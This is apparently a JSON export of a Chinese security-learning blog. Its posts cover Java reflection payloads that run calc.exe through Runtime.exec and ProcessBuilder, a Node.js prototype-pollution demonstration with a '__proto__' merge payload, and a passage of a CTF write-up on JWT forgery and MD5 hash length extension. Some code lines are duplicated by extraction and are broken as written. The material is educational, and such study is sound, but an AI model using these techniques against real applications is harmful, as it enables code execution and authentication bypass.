String[][]&#123;&#123;\"calc.exe\"&#125;&#125;)).start();\n\n这样的话，我们想要传给构造函数的参数，也就是一维数组，就被当作传给newInstance的二维数组的元素形式，传给了构造函数。\n这里可能会产生一个疑惑，不是newInstance也是接收一个一维数组吗，为什么这里可以是二维数组，但是实际上这里的二维数组起的作用也只是一个一维数组，因为它的元素只能有一个一维数组。\n如下，将二维数组中加入两个一维数组元素后，发生报错，期待的参数只有一个，但是却传入了两个，说明这里本质还是需要一个一维数组。\n\n那如果只在newIntance中传入一个一维数组呢？可以看到如果直接将一个一维数组当作参数传入，newInstance就会当作传入的三个元素【&quot;1&quot;,&quot;2&quot;,&quot;3&quot;】都是一个数组，也就是当作传入了三个数组，而没有把整个数组当作一个对象发送给构造函数中去。\n\n而newInstance需要的是一个对象类型的变长参数，所以只需要强类型转换将我们传入的数组整体当作一个对象类型就行。\n\n可以看到成功运行，不过一般情况是用不了强类型转换的，只能用反射之类的方法。\n\n那为什么传入二维数组的时候不用强类型转换呢？\n虽然传入的是二维数组，但实际真正的对象是其元素，也就是一维数组，所以如果直接强类型把二维数组也当做对象传给newIntance反而会报错，newIntance参数类型不匹配，因为newIntrance期待的也是一个一维数组，也就是起作用的只是二维数组中那一个一维数组。\n\n根据p神建议将payload改成全反射方法，\nClass&lt;?&gt; clazz = Class.forName(Class&lt;?&gt; clazz = Class.forName(\"java.lang.ProcessBuilder\");\nclazz.getMethod(\"start\").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;\"calc.exe\"&#125;&#125;));\n\n也是可以的，\n\ngetDeclared这里就是解决第二个问题\n\n\n\n\n\n\n\n\n\n如果一个方法或构造方法是私有方法，我们是否能执行它呢？\n这里就引入了一个getDeclared系列的反射，和getMethod、getConstructor区别在于\n\ngetMethod系列方法获取的是当前类中所有的公共方法，包括从父类继承的方法\ngetDeclared系列方法获取的是当前类中声明的方法，包括私有方法，但是是必须写在类中的，如果是从父类继承而来的就不包含了。\n\n其中getDeclaredMethod和getDeclaredConstructor的具体用法，与getMethod和getConstructor类似，区别如上所述。\n在此第二篇讲过，Runtime的构造函数是私有的，是通过静态方法Runtime.getRuntime()获取其运行实例现在了解了getDeclaredConstructor，就可以通过这个获取Runtime的私有的构造方法来实例化对象，进而执行命令。\nClass clazz = Class.forName(Class clazz = Class.forName(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.getDeclaredConstructor().newInstance(), \"calc\");\n\n这里就是将\nxx.invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), xx.invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), \"calc\");\n\n替换为\nxx.invoke(clazz.getDeclaredConstructor().newInstance(), xx.invoke(clazz.getDeclaredConstructor().newInstance(), \"calc\");\n\n\n\nsetAccessible运行发生报错，\n\n\n\n\n\n\n\n\n\n\n这里报错在p神的文章中说到，这里必须要使用一个方法setAccessible，在获取到了一个私有方法后，必须用setAccessible修改器作用域，否则仍然不能调用。\n所有在这里就报错提醒Runtime构造函数是私有的无法获取，只需要设置setAccessible为true即可拥有访问域。\npublic class public class Runtime_Getdeclared &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Class clazz = Class.forName(\"java.lang.Runtime\");\n        Constructor m = clazz.getDeclaredConstructor();\n        m.setAccessible(true);\n        clazz.getMethod(\"exec\", String.class).invoke(m.newInstance(), \"calc.exe\");\n    &#125;\n&#125;\n\n但是还是报错，\n\n问了AI才知道，\n\n\n\n\n\n\n\n\n\n这个错误是因为Java 9引入的模块系统。在模块化Java应用程序中，一个模块只能访问到它明确打开给其他模块的包。在你的情况下，java.lang包没有被打开给你的模块，所以你不能访问它的私有成员\n从Java 9开始，setAccessible(true)不再总是能成功地使得私有成员可访问。如果一个包没有被打开给你的模块，那么尝试访问它的私有成员将会抛出InaccessibleObjectException\n正好有个Java8，试试改一下编译器环境变量再跑一下\n\n可能会报错，这是因为这个项目我们已经用高版本的JDK编译过一次了，而高版本能兼容低版本的，但是低版本就无法运行高版本的，所以会报错\n\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/superit401/article/details/72731381\n于是直接写个txt跑Java8\n\n发现运行成功，当然虽然是低版本，但是setAccessible还是必须存在的，\n\n","slug":"Java安全[反射(3)]","date":"2023-09-09T04:23:45.002Z","categories_index":"Java漫谈学习","tags_index":"Java","author_index":"Ttoc"},{"id":"e43b6f3b7810dafca0563d222be1226a","title":"nodejs(原型链污染)深入","content":"本来想将p神的JavaScript污染链文章并在我写的基础浅入里，但是感觉还是得分开学习记录，p神干货还得和我水的文章分开，浅入就讲概念理解学习吧，深入就涉及深入认识污染了\n\n\nprototype和__proto__分别是什么\n\n\n\n\n\n\n\n\n这里引用p神的文章，加上部分自己的理解\nhttps://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript\n理解在JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式定义:\nfunction Foo(function Foo() &#123;\n    this.bar = 1\n&#125;\n\nnew Foo()\n\n\n其中Foo函数就是Foo类的构造函数，其中的this.bar是Foo类中的一个属性。\n\n\n\n\n\n\n\n\n\n\n也就是说利用function定义类的同时，构造函数也被定义好了\n\n\n\n\n\n\n\n\n\n在ES6中引入了class的概念，两者是有区别，但是不是很大\nclass本质还是基于原型prototype的实现方式进一步的封装，class本质还是函数function\n但是使用class定义类比function使得代码更加直观，也更加灵活，因为class定义类时，可以直接使用constructor()方法来定义构造函数，并且可以使用关键字extends来继承父类\nclass class Foo &#123;\n    constructor() &#123;\n        this.bar = 1\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\n\n可以看到用class定义类的时候，构造函数也是被定义好了\n并且function和class两者的构造函数的名字也是一样的\n\n\n在一个类必然有一些方法，类似属性this.bar，我们也可以将方法定义在构造函数的内部\nfunction Foo(function Foo() &#123;\n    this.bar = 1\n    this.show = function() &#123;\n        console.log(this.bar)\n    &#125;\n&#125;\n\n(new Foo()).show()\n\n代码中我们可以看到，show的定义利用了function，但是并没有被定义为show类，也就是说这个show方法并不是和上面一样是所谓show类的构造函数，而是Foo类中Foo这个构造函数的一个方法\n如下图结果可以理解，在新建实例化Foo对象，执行构造函数时，show方法也会被执行可知，show只是构造函数中的一个方法，是绑定在对象中的吗，而不是绑定在类\n\n\n但由此出现了一个新问题，那如果每次新建一个实例化对象就执行一次show方法，有时在实际生产中并不需要，可能大多数时候只想在创建类后执行一次即可\n那肯定就不能把show方法再写到function Foo&#123;&#125;中去了，\n\n\n\n\n\n\n\n\n\n这里就需要使用原型prototype\nfunction Foo(function Foo() &#123;\n    this.bar = 1\n&#125;\n\nFoo.prototype.show = function show() &#123;\n    console.log(this.bar)\n&#125;\n\nlet foo = new Foo()\nfoo.show()\n\n这段代码其实也好理解，我们将show方法单独提出来当作一个函数，并加到Foo的原型当作一个单独的函数，prototype可以当作Foo类自带的一个属性，所有的创建的Foo对象都将拥有Foo类中所有内容，包括变量和方法。\n\n可以看到和在构造函数中定义show不同的是，show作为和构造函数一样的显示在原型内容中，属于是新创建的Foo类对象可以利用的一部分。\n\n这里将Foo类实例化后给foo，foo也完全可以直接调用show函数的内容，foo自身创建开始就具有Foo中的所有变量方法可以调用。\n\n关键点我们可以通过Foo.prototype来访问Foo类的原型，但是Foo类实例化出来的对象，如上的foo，是不能直接调用prototype进行访问原型的\n\n所以这里就需要提到__proto__，类实例化后的对象可以通过__proto__来直接访问类的原型。\n也就是\nfoo.__proto__ == Foo.foo.__proto__ == Foo.prototype\n\n\n进一步思考，也就是实例化后的对象【[比如foo]可以像上面例子一样，通过__proto__访问原型定义一个新的函数，如下例子，利用foo.__proto__定义了一个新函数hacker\n并且能成功调用执行，打印’i get shell‘\nfoo.__proto__.hacker = function hacker(foo.__proto__.hacker = function hacker() &#123;\n    console.log(\"i get shell\")\n&#125;\n\n\n\n总结\n\n\n\n\n\n\n\n\n\nprototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法\n一个对象的__proto__属性，指向这个对象所在的类的prototype属性\n\nJavaScript原型链继承继承在java中很常见，在JavaScript中作用也差不多，只不过概念被替换成原型了\n\n\n\n\n\n\n\n\n\n所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。\n比如，\nfunction Father(function Father() &#123;\n    this.first_name = &#x27;Donald&#x27;\n    this.last_name = &#x27;Trump&#x27;\n&#125;\n\nfunction Son() &#123;\n    this.first_name = &#x27;Melania&#x27;\n&#125;\nSon.prototype = new Father()\n\nlet son = new Son()\nconsole.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)\n\n这里的，\nSon.prototype = new Son.prototype = new Father()\n\n可以理解为Son的原型为实例化的Father类，Son类就会继承Father类得得last_name属性，但是继承不会覆盖自己原有的属性，所以first_name还是Son类自己的\n\n然后再将Son实例化给son，那么son就具有Son类和Father类的所有属性\nlet son = new let son = new Son()\n\n\n可以在这里的层次就可以看出，son的first_name是以Son类为主的，而由于自身没有last_name，就会从自己原型Father类继承last_name然后获取值\n于是当打印时，最后输出的是Name: Melania Trump。\nconsole.log(`Name: $&#123;son.first_name&#125; console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)\n\n\n总结以上述的Son类和Father类为例，我们可以看到son的层次中，是有两个Prototype，这就是原型链的最简单的格式。最后一个Object就是null，他在原型Father类的后面，这也是原型链默认的最后一个原型。\n我们可以考虑一个问题，当我在打印$&#123;son.last_name&#125;，如果在Father类中也没有这个属性会怎么样呢，那son就会不断的顺着原型链一直找下去，直到null\n就会执行，\nson.__proto__.__proto__.__proto__.son.__proto__.__proto__.__proto__.__proto__\n\n\nJavaScript这种查找机制，被用在面向对象的继承中，被称作prototype继承链。\n以上是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记下面几点即可：\n\n\n\n\n\n\n\n\n\n\n每个构造函数都有一个原型对象\n对象的__proto__属性，指向类的原型对象prototype\nJavaScript使用prototype链实现继承\n\n原型链污染是什么在最开始写过foo.__proto__指向Foo类的prototype，我们也试过通过foo.__proto__新增一个新函数，也可以加到原型中去，并且可以成功调用与构造函数同一层次，那么如果修改foo.__proto__中的一些值，同理也可以修改Foo类中的一些东西\n我们简单试一下，\n// foo是一个简单的JavaScript对象\nlet foo = &#123;bar: 1&#125;\n\n// foo.bar 此时为1\nconsole.log(foo.bar)\n\n// 修改foo的原型（即Object）\nfoo.__proto__.bar = 2\n\n// 由于查找顺序的原因，foo.bar仍然是1\nconsole.log(foo.bar)\n\n// 此时再用Object创建一个空的zoo对象\nlet zoo = &#123;&#125;\n\n// 查看zoo.bar\nconsole.log(zoo.bar)\n\n首先我们先构造一个简单对象foo，\nlet foo = &#123;bar: let foo = &#123;bar: 1&#125;\n\n由于foo并不是某个具体类的实例，但是所有对象都有一个实例存在，那就Object类\n然后我们先看看，\nconsole.log(foo.console.log(foo.bar)\n\n\n同样可以看到foo确实存在一个原型，并且为Object。\n那么如果我们通过foo.__proto__修改原型中的某些值呢？\nfoo.__proto__.bar = foo.__proto__.bar = 2\n\n这里我们通过foo.__proto__将bar值修改为2，\n然后打印看看，\n\n突然发现，打印的结果是1，而不是我们刚才修改的结果2\n这是为什么呢？\n我们再次看看foo就知道了\n\n\n\n\n\n\n\n\n\n\n我们可以看到，bar: 1是foo自身的属性，而原型Object中的bar: 2，层次要低于foo自身的属性，所以相同的属性，还是以自身优先，不存在或者不完善，才从原型中继承，这和上面讲的Son类和Father类是一样的。\n所以这里打印结果还是1，就是这个原因。\n但是，如果我们再新建一个对象，让它和foo一样，原型也是只有Object，但是没有bar属性，再次打印会怎么样呢\nlet zoo = &#123;&#125;\nconsole.log(zoo.bar)\n\n\n可以看到打印结果为2，因为这里zoo对象没有bar属性，所以这里zoo就直接继承Object中bar属性，而Object本身并没有bar属性，是foo通过foo.__proto__来新增的一个属性，却能达到影响zoo对象的作用。\n\n\n\n\n\n\n\n\n\n那么，这种在一个应用中，攻击者控制并修改了一个对象的原型，那么将可能影响所有和这个对象来自同一个类。父祖类的对象。这种攻击方式就是原型链攻击\n哪些情况下原型链会被污染呢？根据上述内容，我们发现关键在于能够顺利调用__proto__并设置其值即可，那么如何成功呢？\n\n\n\n\n\n\n\n\n\n关键在于找到能够控制数字【对象】的“键名”的操作即可：\n\n对象merge\n对象clone（其实内核就是将待操作的对象merge到一个空对象中）\n\n以对象merge为例，我们想象一个简单的merge函数：\nfunction merge(function merge(target, source) &#123;\n    for (let key in source) &#123;\n        if (key in source && key in target) &#123;\n            merge(target[key], source[key])\n        &#125; else &#123;\n            target[key] = source[key]\n        &#125;\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\n这个函数是一个递归函数，它的目的是将 source 对象中的属性合并到 target 对象中。它通过遍历 source 对象中的每一个键值对，如果 target 对象中也存在这个键，那么就递归调用 merge 函数将两个对象中对应键的值进行合并；否则，就直接将 source 对象中的键值对复制到 target 对象中。最终，target 对象将包含原来的属性以及 source 对象中的所有属性。这个函数通常用于合并两个或多个对象，以便于在一个对象中访问所有属性。\n我们看到，在合并时存在复制操作target[key] = source[key]，那么如果这个key是__proto__，是否就可以成功造成污染呢？\n试一下，\nlet o1 = &#123;&#125;\nlet o2 = &#123;a: 1, \"__proto__\": &#123;b: 2&#125;&#125;\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = &#123;&#125;\nconsole.log(o3.b)\n\n这里可以看到o1和o2确实是合并成功了\n\n但是我们的__proto__不见了，取而代之发现多了个Object原型，也就是说我们的__proto__被当作o2的原型，也就是其自身的Object，但是并没有影响最后一个每个对象共有Object，所以污染是无效的\n此时遍历o2的所有键名，拿到的只要[a,b]，__proto__并不是一个key，自然也不无法修改Object的原型。\n\n所有当我们想用o3测试是否污染时，发现是没有的\n\n\n那么如何将__proto__被当作是一个键名呢，只要加一个解析就行\nlet o1 = &#123;&#125;\nlet o2 = JSON.parse(&#x27;&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;&#x27;)\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = &#123;&#125;\nconsole.log(o3.b)\n\n再看看o2的数据，\n\n发现这次__proto__，没有被当作o2的原型了，而是一个键值\n此时再次打印o3，发现成功污染Object\n\n\n\n\n\n\n\n\n\n\nJSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。\n可以是为什么能实现将属性b以及其值污染到Object中呢？\n其实很简单，\n我们实际修改原型时用的语法是\no2.__proto__.b = o2.__proto__.b = 2\n\n而读取数组中键值也是如此语法，所以当键值为__proto__时，调用__proto__其后的数据因为语法，会被当作修改原型的值，从而实现原型链污染的作用\n\n\n\n\n\n\n\n\n\nps. merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。\n\n\n\n\n\n\n\n\n\n\n最后可以做一下p神的\nCode-Breaking 2018 Thejs\nhttps://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js\n","slug":"nodejs(原型链污染)深入","date":"2023-09-01T05:53:59.950Z","categories_index":"网络安全学习","tags_index":"js","author_index":"Ttoc"},{"id":"e19214c909dc9beefabf464664f17048","title":"nodejs(原型链污染)浅入","content":"狠狠污染链，狠狠的继承类\n\n\n原型与原型链\n\n\n\n\n\n\n\n\n想要原型链污染，先要了解什么是原型与原型链\nJavascript中一切皆是对象，其中对象之间是存在共同和差异的，比如对象的最终原型是Object是原型null，函数对象有prototype属性，但是实例对象没有。\n原型的定义\n\n\n\n\n\n\n\n\nJavaScript原型是一种对象继承的机制，它允许对象共享属性和方法。\n每个对象（除了null）都有一个原型对象，它可以通过__proto__属性或Object.getPrototypeOf()方法来访问。\n每个函数对象（除了箭头函数）都有一个prototype属性，它指向该函数作为构造函数时创建的实例对象的原型。\n\n\n\n\n\n\n\n\n\n原型就是一个对象，它可以给其他对象提供共用的属性和方法。比如，你有一个人类的原型，它有姓名、年龄、说话等属性和方法，那么你可以用这个原型来创建很多人的对象，他们都会继承这些属性和方法。\n原型链的定义\n\n\n\n\n\n\n\n\njs 是由对象组成的，对象与对象之间存在着继承关系\n每个对象都有一个指向它的原型的内部链接，而这个原型对象又有他自己的原型，直到 null 为止\n整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链\n\n\n\n\n\n\n\n\n\n原型之间也可以相互继承，比如你有一个学生类的原型，它继承了人类的原型，但是它还有自己的属性和方法，比如学号、学习等。那么你可以用这个学生类的原型来创建很多学生的对象，他们既会继承人类的属性和方法，也会继承学生类的属性和方法。这样就形成了一个原型链，它决定了对象之间的关系。\n原型对象的定义\n\n\n\n\n\n\n\n\n原型对象是JavaScript中的一种特殊的对象，它可以被附加到其他对象或函数上，从而实现对象之间的继承和共享。原型对象本身也是一个对象，它有自己的原型，形成一个原型链。原型链在遇到null为原型的对象时结束。您可以通过设置或修改一个对象或函数的prototype属性来改变它的原型。\n&gt;&gt;// 创建一个空对象\nvar obj = &#123;&#125;;\n>// 设置obj的原型为另一个对象\nobj.__proto__ = &#123;name: \"Alice\", age: 20&#125;;\n// 访问obj的name属性，实际上是访问它的原型的name属性\nconsole.log(obj.name); // Alice\n\n可以直接在控制台中进行\n\n\n\n\n\n\n\n\n\n\n在JavaScript中,声明一个函数A的同时,浏览器在内存中创建一个对象B,然后A函数默认有一个属性prototype指向了这个对象B,这个B就是函数A的原型对象,简称为函数的原型。这个对象B默认会有个属性constructor指向了这个函数A。\n如下图中，函数Foo的prototype指向&#123;constuctor:f&#125;，而&#123;constuctor:f&#125;的属性constuctor指向函数Foo\n\n实例对象\n\n\n\n\n\n\n\n\n我们可以通过构造函数A构建一个实例对象A，A默认会有一个属性__proto__指向了构造函数A的原型对象B。\n原型对象和实例对象的关系如下图中，foo为Foo函数的实例化对象，foo的__proto__刚好等于Foo函数的原型对象，返回为true\n\n原型链机制概念可以看一下\n\n\n\n\n\n\n\n\n\n每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。那么假如我们让原型对象等于另一个类型的实例，结果会怎么样？显然，此时的原型对象将包含等于另一个原型的指针，相应地，另一个原型又是另一个类型地实例，那么上述地关系依然成立。如此层层递进，就构成了实例与原型的链条\n概念太绕了，解析一下图片\n\nPerson作为构造函数，每一个构造函数都有一个原型对象Person.prototype，而原型对象都包含一个指向构造函数的指针[constructor]\n而其中person作为Person构造函数的实例[let person = new Person();]，也包含一个指向原型对象的内部指针[__proto__]\n于是最后这个原型链就是\n\n\n\n\n\n\n\n\n\nperson -&gt; Person.protype -&gt; Object.prototype -&gt; null\n可以看到原型链的结尾就是null\n过滤绕过__proto__\n\n\n\n\n\n\n\n\nconstructor.prototype\n","slug":"nodejs(原型链污染)浅入","date":"2023-08-25T02:16:13.700Z","categories_index":"网络安全学习","tags_index":"js","author_index":"Ttoc"},{"id":"d574ea4f3aa1b406fd1d29f7afa502ba","title":"Java安全[反射(2)]","content":"Java学好的主要性太大了，之前我一直没总体归纳，这次彻底狠狠的深入\n主要阅读p牛的&lt;&lt;Java安全漫谈&gt;&gt;\n\n\nJava安全[反射(2)]本文要点\n\n\n\n\n\n\n\n\n如何利用Runtime构造payload\n\n第一篇讲到过，如果想要加载一个类，可以同forName进行加载，但是正常情况下我们一般用到的是import，所以forName就可以帮助攻击者加载任意类。\n内部类对于$，在很多源码里看到，类名包含$符号，比如在fastjion在checkAutoType时候就会先将 $替换为.\n\n\n\n\n\n\n\n\n\nhttps://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038\n\n可以看到类名的$被替换为.来解析，所以$起的作用实际就是查找内部类。\n写个例子，在一个普通类My中，写一个内部类Your，然后编译看看output文件夹会生成什么\npackage reflect2;\n\npublic class InsideClass &#123;\n    public static void main(String[] args) &#123;\n    &#125;\n&#125;\nclass My&#123;\n    class Your&#123;\n\n    &#125;\n&#125;\n\n\n可以看到，Your类对应生成了一个My$Your.class，My类对应生成了一个My.class。\n我们还可以试试加载这两个，看看是否有区别\npackage reflect2;\n\npublic class InsideClass &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Class c1 = Class.forName(\"reflect2.My$Your\");\n        System.out.println(c1.getName());\n    &#125;\n&#125;\nclass My&#123;\n    static &#123;\n        System.out.println(\"My类被加载\");\n    &#125;\n    class Your&#123;\n        static &#123;\n            System.out.println(\"Your类被加载\");\n        &#125;\n    &#125;\n&#125;\n\n\n发现初始化内部类时，外部类并没有被初始化，所以在一定程度上可以将它们当作两个无关类。\n根据上面所说，Java会将$当作 . ，那如果直接把$换成 . 的话会怎么样\n\n发现运行报错，原因是Java编译器有自己的规则，$在它的规则中是外部类和内部类的分隔符，但是如果用 .来分割外部类和内部类就会让其分不清意图，从而报错，虽然其内部会将其当作 . ，但是前提还是$被当作内外部类分割符后处理。\ngetRuntimeclass.newInstrance() 作用是调用这个类中的无参构造函数，但是经常直接在payload中调用newIntstrance时往往会报错，主要有两个原因\n\n\n\n\n\n\n\n\n\n\n目标类没有无参构造函数\n目标类的构造函数是私有的\n\n最常遇到的情况下是，调用java.lang.Runtime，\npackage reflect2;\n\nimport java.lang.reflect.InvocationTargetException;\n\npublic class Instrance &#123;\n    public static void main(String[] args) throw Exception &#123;\n        Class cls = Class.forName(\"java.lang.Runtime\");\n        cls.getMethod(\"exec\",String.class).invoke(cls.getDeclaredConstructor().newInstance(),\"calc.exe\");\n    &#125;\n&#125;\n\n发现报错中提示java.lang.Runtime是一个私有的类，是无法直接调用其中的方法\n\n继续跟进这个类的内容，\n\nRuntime确实为了安全考虑，将其的构造函数设置为私有，为了不让任何其他人实例化这个类，这里的话就无法通过newInstrance直接进行实例化Runtime，也就无法执行exec函数。\n那这里就会有个问题，如果有类的构造函数是私有，那不是代表当用户想要使用这个类时，无法进行实例化，就无法使用，而正常业务中为什么会出现这种情况呢？\n其实，这种情况叫做“单例模式”，是一种很常见的业务模式。\n比如，网站的数据库连接，当连接成功后，就不需要每用一次就建立一次网站数据库连接，这样就会建立多个数据库连接，造成资源浪费。这样开发者在编写代码时就会将构造函数写出私有，并通过静态方法来获取这个函数。\n\n\n\n\n\n\n\n\n\n在第一篇中提到过，初始化时，静态方法和静态变量只加载一次，而创建类对象时，构造函数则会每构造一个类对象就执行一次。\n写个代码举个例子，\npackage reflect2;\n\npublic class PrivateInstance &#123;\n    public static void main(String[] args) throws Exception &#123;\n         Class cls = Class.forName(\"reflect2.TrainDB\");\n    &#125;\n&#125;\nclass TrainDB &#123;\n    private static final TrainDB instance = new TrainDB();\n\n    public static TrainDB getInstance() &#123;\n        return instance;\n    &#125;\n    private TrainDB() &#123;\n        System.out.println(\"Done\");\n    &#125;\n&#125;\n\n这样只有在初始化时才会执行一次静态变量，实例化TrainDB类，并执行构造函数，而后只能通过调用getInstance() ，才可以获得其实例，但是不会执行构造函数，这样也避免了多次建立实例。\n\npaload构造回归正题，Runtime也是一样的，它也是单例模式，只能通过Runtime.getRuntime()获取Runtime的实例\n\n那么要构造payload就需要改一下，就不能用newIntstrance进行对Runtime的实例化，只有通过Runtime.getRuntime这个设定的静态方法获取Runtime的实例化后的对象。\npackage reflect2;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class InstanceRuntime &#123;\n    public static void main(String[] args) throws Exception &#123;\n        Class clazz = Class.forName(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz),\"calc.exe\");\n    &#125;\n&#125;\n\n在这里，\nClass clazz = Class.forName(Class clazz = Class.forName(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz),\"calc.exe\");\n\n发现用了getMethod方法和invoke方法，\n\ngetMethodgetMethod的作用就算通过反射获得一个类的某个特定的公有方法。其需要两个参数，第一个是方法名，第二个是方法所需参数的类型  [ 比如，字符串就算String.class] 。\n但是在Java中支持类的重载，也就是可能存在多个相同的名字的但是参数列表或者类型不同的方法，所以只知道名字并不能直接确认函数。\n所以在这里想调用exec方法时，就需要看看在Runtime中其重载列表，看看目标方法中所需的参数类型及其列表。\n\n这里可以用第四个重载类型，只要一个字符串，最简单。而前三个要字符串数组，也就是一个命令加上参数之类的。\n所以就得到了通过以下代码获取Runtime.exec方法\ngetMethod(getMethod(\"exec\",String.class);\n\ngetMethod获得这个方法后，就需要执行这个方法，比如传入参数等等。\ninvokeinvoke的作用就是执行方法，它的第一个参数是：\n\n如果这个方法是一个普通的方法，那么第一个参数就是类对象\n\n如果这个方法是一个静态的方法，那么第一个参数是类\n\n\n\n\n\n\n\n\n\n原因是普通方法需要类实例化后得到类对象，才可以调用该普通方法，所以需要传入类对象。\n而静态方法不用实例化类，就可以直接调用，所以传入类名即可。\n\n\n其实转化一下就更加清楚了，\n正常调用一个方法是 [1].method([2], [3], [4]...) ，而在反射里就是 method.invoke([1], [2], [3], [4]...) 。其中[1]是类或者类对象，而后[...]就是传入方法的参数。\npaload分析按上述的，分解一下payload，\n这里先初始化Runtime类，\n然后获取Runtime的exec方法，\n然后再获取Runtime的getRuntime方法，\n然后执行getRuntime获取Runtime的实例化对象，这里invoke传入任何都可以，因为这里getRuntime方法是无参方法，所以不需要参数也行。\n最后调用，exec方法，invoke第一个传入Runtime的实例化对象，第二传入执行的命令calc。\nClass clazz = Class.forName(Class clazz = Class.forName(\"java.lang.Runtime\");\nMethod execMethod = clazz.getMethod(\"exec\", String.class);\nMethod getRuntimeMethod = clazz.getMethod(\"getRuntime\");\nObject runtime = getRuntimeMethod.invoke(clazz);\n((Method) execMethod).invoke(runtime, \"calc\");\n\n\n最后两个疑问，\n\n\n\n\n\n\n\n\n\n\n如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？\n如果一个方法或构造方法是私有方法，我们是否能执行它呢？\n\n","slug":"Java安全[反射(2)]","date":"2023-08-23T01:46:39.171Z","categories_index":"Java漫谈学习","tags_index":"Java","author_index":"Ttoc"},{"id":"4b46cdd516927b937a38437aec23a08d","title":"2023(星)CTF","content":"咋只有一道web，全是ai题\n\n\njwt2struts看题目猜测考点是jwt伪造+s2漏洞\n进入网站，发现是需要admin身份，也确实是jwt伪造\n\n解析jwt用JSON Web Tokens - jwt.io进行解析，发现确实是jwt\n\n但是不知道密钥，\n先尝试是不是空密钥，直接修改为admin\n\n得到新的jwt\n\n\n\n\n\n\n\n\n\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjM5MzI5N30.L0YCThgRESeqIu8mUgr_IjD6CYadVNFH4sQ29w40nnU\n代入再次访问网站\n结果提示token无效，\n\n查看网页源码发现\n提示JWT_key.php\n\n这应该就是jwt生成和身份验证的php代码\n访问得到代码\n\nhighlight_file(__FILE__);\ninclude \"./secret_key.php\";\ninclude \"./salt.php\";\n//$salt = XXXXXXXXXXXXXX // the salt include 14 characters\n//md5($salt.\"adminroot\")=e6ccbf12de9d33ec27a5bcfb6a3293df\n@$username = urldecode($_POST[\"username\"]);\n@$password = urldecode($_POST[\"password\"]);\nif (!empty($_COOKIE[\"digest\"])) &#123;\n    if ($username === \"admin\" && $password != \"root\") &#123;\n         if ($_COOKIE[\"digest\"] === md5($salt.$username.$password)) &#123;\n            die (\"The secret_key is \". $secret_key);\n        &#125;\n        else &#123;\n            die (\"Your cookies don&#x27;t match up! STOP HACKING THIS SITE.\");\n        &#125;\n    &#125;\n    else &#123;\n        die (\"no no no\");\n    &#125;\n&#125;\n\nno no no\n\n分析代码发现想要得到key，关键在于这段条件语句的绕过\nif ($username === &quot;admin&quot; &amp;&amp; $password != if ($username === &quot;admin&quot; &amp;&amp; $password != \"root\") &#123;\n        if ($_COOKIE[\"digest\"] === md5($salt.$username.$password)) &#123;\n           die (\"The secret_key is \". $secret_key);\n\n$username和$password好实现\n\n\n\n\n\n\n\n\n\nusername:admin，password:除了root以为的字符\n\n\n\n\n\n\n\n\n\n$_COOKIE[&quot;digest&quot;]要求为md5($salt.$username.$password)\n也就是$_COOKIE[&quot;digest&quot;]要为盐+名字+密码的字符串的md5值\n现在知道，\n\n\n\n\n\n\n\n\n\n盐的长度是14，\n且md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df\nhash长度拓展攻击对于这种未知salt，但又要进行绕过MD5或者sha1加密的，就可以考虑用hash长度拓展攻击\nhash长度扩展攻击 | KANGEL (j-kangel.github.io)\n【个人分析写在笔记上】\n利用工具hashdump\nInput Signature                    #现有哈希值（题目给的MD5）\nInput Data                         #已知字符串\nInput Key Length                   #为密文（salt）长度\nInput Data to Add                  #为补位后自己加的字符串（自定义）\n\n\n\n\n\n\n\n\n\n\n\n\n\nInput Signature: e6ccbf12de9d33ec27a5bcfb6a3293dfInput Data: adminrootInput Key Length: 14Input Data to Add: Jay8ae52974e81aace9837123a520cb8179adminroot\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xb8\\x00\\x00\\x00\\x00\\x00\\x00\\x00Jay\n然后把\\x换成%\n\n此时，\n\n\n\n\n\n\n\n\n\n$_COOKIE[&quot;digest&quot;]\n就为Cookie: 